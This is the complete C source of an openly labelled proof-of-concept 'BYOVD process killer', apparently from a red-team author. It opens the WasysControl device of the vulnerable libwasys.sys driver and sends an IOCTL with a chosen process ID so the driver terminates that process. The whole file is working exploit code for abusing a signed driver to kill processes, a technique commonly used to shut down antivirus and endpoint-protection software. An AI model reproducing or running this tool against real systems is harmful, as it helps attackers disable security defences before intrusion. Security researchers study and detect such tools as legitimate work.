/*
 * libwasys.sys BYOVD Process Killer POC
 * Author: Jehad Abudagga (@j3h4ck)
 * https://github.com/redteamfortress
 *
 * Usage: libwasys_poc.exe <PID>
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DEVICE "\\\\.\\WasysControl"
#define IOCTL_KILL 0x22E00C

int main(int argc, char* argv[])
{
    HANDLE hDevice;
    DWORD pid, bytesReturned = 0;

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid = (DWORD)strtoul(argv[1], NULL, 10);
    if (pid == 0) {
        printf("[-] Invalid PID\n");
        return 1;
    }

    hDevice = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device\n");
        return 1;
    }

    printf("[*] Target PID: %u\n", pid);

    if (DeviceIoControl(hDevice, IOCTL_KILL, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
        printf("[+] Process terminated\n");
    } else {
        printf("[-] Kill failed: 0x%08lX\n", GetLastError());
    }

    CloseHandle(hDevice);
    return 0;
}
